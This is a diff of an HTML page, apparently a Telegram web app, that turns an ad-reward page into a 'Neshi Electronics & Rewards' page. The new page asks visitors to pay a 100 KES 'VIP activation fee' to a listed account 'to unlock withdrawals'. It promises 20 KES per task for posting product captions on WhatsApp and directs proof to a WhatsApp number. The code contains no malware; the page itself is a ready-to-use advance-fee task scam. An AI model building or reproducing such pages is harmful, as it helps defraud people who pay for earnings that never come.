@@ -1,83 +1,66 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RichAds Official Center</title>
-    
+    <title>Neshi Electronics & Rewards</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://richinfo.co/richpartners/telegram/js/tg-ob.js"></script>
-    
     <style>
-        :root { --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --accent: #3b82f6; }
-        body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; text-align: center; }
-        .grid { display: grid; grid-template-columns: 1fr; gap: 15px; max-width: 400px; margin: 0 auto; }
-        .ad-card { background: var(--card); padding: 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); }
-        .btn { background: var(--accent); color: white; border: none; padding: 14px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .btn:active { transform: scale(0.96); }
-        .btn-gray { background: #475569; }
-        .reward { color: #4cd964; font-size: 12px; font-weight: bold; display: block; margin-bottom: 8px; }
-        #embedded-banner { min-height: 50px; background: rgba(0,0,0,0.2); border-radius: 8px; margin-top: 10px; }
+        :root { --bg: #0f172a; --card: #1e293b; --green: #25D366; --accent: #3b82f6; --text: #ffffff; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; }
+        .hero { background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1498049794561-7780e7231661?w=500'); background-size: cover; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px; }
+        .pay-card { background: rgba(59, 130, 246, 0.1); border: 1px solid var(--accent); border-radius: 20px; padding: 20px; margin-bottom: 20px; text-align: center; }
+        .acc-box { background: #000; padding: 10px; border-radius: 10px; font-family: monospace; font-size: 20px; color: var(--accent); margin: 10px 0; border: 1px solid #334155; }
+        .product-card { background: var(--card); border-radius: 20px; overflow: hidden; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.05); }
+        .prod-img { width: 100%; height: 180px; object-fit: cover; }
+        .prod-info { padding: 15px; }
+        .price { color: #f87171; font-size: 19px; font-weight: bold; display: block; }
+        .btn-copy { background: var(--green); color: white; border: none; padding: 12px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; }
+        .btn-submit { background: #ffffff; color: #000; border: none; padding: 16px; border-radius: 15px; width: 100%; font-weight: 800; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
+    <div class="hero">
+        <h1 style="margin:0;">Neshi Electronics</h1>
+        <p style="opacity: 0.8;">Post Status & Earn Cash</p>
+    </div>
 
-    <h2 style="margin-bottom: 5px;">RichAds Earn Center</h2>
-    <p style="color: #94a3b8; font-size: 14px; margin-bottom: 25px;">Activate all 5 formats to start earning</p>
+    <div class="pay-card">
+        <span style="font-weight: bold; color: var(--accent);">VIP ACTIVATION FEE: 100 KES</span>
+        <div class="acc-box">ACC: 1327227169</div>
+        <p style="font-size: 11px; opacity: 0.8;">Pay to the account above to unlock withdrawals.</p>
+    </div>
 
-    <div class="grid">
-        <div class="ad-card">
-            <span class="reward">FORMAT 1</span>
-            <button class="btn" onclick="triggerAd('video')">🎬 Watch Video Ad</button>
-        </div>
+    <h3 style="margin-left: 10px;">📦 Marketing Tasks (Earn 20 KES)</h3>
 
-        <div class="ad-card">
-            <span class="reward">FORMAT 2</span>
-            <button class="btn" onclick="triggerAd('interstitial')">🖼️ Show Interstitial</button>
-        </div>
-
-        <div class="ad-card">
-            <span class="reward">FORMAT 3</span>
-            <button class="btn btn-gray" onclick="triggerAd('playable')">🎮 Play Demo Game</button>
-        </div>
-
-        <div class="ad-card">
-            <span class="reward">FORMAT 4</span>
-            <button class="btn btn-gray" onclick="triggerAd('push')">🔔 Show Push Alert</button>
-        </div>
-
-        <div class="ad-card">
-            <span class="reward">FORMAT 5 (AUTO)</span>
-            <div id="richads-banner-container"></div>
-            <p style="font-size: 11px; color: #94a3b8;">Embedded Banner Loading...</p>
+    <div class="product-card">
+        <img src="https://images.unsplash.com/photo-1593305841991-05c297ba4575?w=500" class="prod-img">
+        <div class="prod-info">
+            <span class="price">KSh 11,500</span>
+            <p id="cap1" style="font-size: 13px;">"Vitron 32-inch Smart Android TV! KSh 11,500 at Neshi Electronics. DM to buy!"</p>
+            <button class="btn-copy" onclick="copyText('cap1')">📋 Copy Caption</button>
         </div>
     </div>
 
-    <p style="margin-top: 30px;"><a href="index.html" style="color: var(--accent); text-decoration: none;">← Back to Dashboard</a></p>
+    <div class="product-card">
+        <img src="https://images.unsplash.com/photo-1496181133206-80ce9b88a853?w=500" class="prod-img">
+        <div class="prod-info">
+            <span class="price">KSh 28,500</span>
+            <p id="cap2" style="font-size: 13px;">"HP EliteBook - Core i5, 8GB RAM. Perfect for work. KSh 28,500 at Neshi!"</p>
+            <button class="btn-copy" onclick="copyText('cap2')">📋 Copy Caption</button>
+        </div>
+    </div>
+
+    <div style="background: var(--card); padding: 20px; border-radius: 20px; border: 1px solid var(--green);">
+        <button class="btn-submit" onclick="window.open('https://wa.me/254717404332?text=I+have+posted+the+ad.+Here+is+my+proof.')">📤 SUBMIT PROOF</button>
+    </div>
 
     <script>
-        // Start Telegram Web App
-        window.Telegram.WebApp.ready();
-        window.Telegram.WebApp.expand();
-
-        // Initialize RichAds with PRODUCTION MODE
-        const ads = new TelegramAdsController();
-        ads.initialize({
-            pubId: "1001227",
-            appId: "6034",
-            production: true // IMPORTANT: This forces the server to send real ads
-        });
-
-        // Preload everything immediately for speed
-        ads.preloadVideoAd();
-        ads.preloadInterstitial();
-
-        function triggerAd(type) {
-            console.log("Requesting: " + type);
-            if (type === 'video') ads.showVideoAd();
-            else if (type === 'interstitial') ads.showInterstitial();
-            else if (type === 'playable') ads.showPlayableAd();
-            else if (type === 'push') ads.showPushAd();
+        function copyText(id) {
+            const text = document.getElementById(id).innerText;
+            navigator.clipboard.writeText(text);
+            alert("Caption Copied! Now post it on your WhatsApp.");
         }
     </script>
 </body>
